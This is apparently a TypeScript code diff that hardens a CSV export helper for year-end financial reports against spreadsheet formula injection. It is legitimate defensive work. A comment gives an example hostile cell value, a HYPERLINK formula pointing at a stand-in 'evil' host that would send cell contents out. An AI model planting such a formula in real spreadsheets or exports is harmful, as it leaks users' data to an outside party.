@@ -2,10 +2,19 @@ import type { PLRow, ExpenseRow, PaymentRow, TaxRow } from "./year-end-reports";
 
 // ── Helpers ──────────────────────────────────────────────────────────────────
 
+// Prefix-guard against CSV/spreadsheet formula injection. Excel/Sheets/Numbers
+// treat cells starting with =, +, -, @, tab, or CR as formulas, so a hostile
+// client-supplied value like `=HYPERLINK("http://evil/?"&A1,"click")` would
+// run on open. Prefixing with a single quote neutralizes it.
+const FORMULA_PREFIX = /^[=+\-@\t\r]/;
+
 function esc(value: string | number | null | undefined): string {
   if (value == null) return "";
-  const str = String(value);
-  if (str.includes(",") || str.includes('"') || str.includes("\n")) {
+  let str = String(value);
+  if (FORMULA_PREFIX.test(str)) {
+    str = `'${str}`;
+  }
+  if (str.includes(",") || str.includes('"') || str.includes("\n") || str.includes("\r")) {
     return `"${str.replace(/"/g, '""')}"`;
   }
   return str;
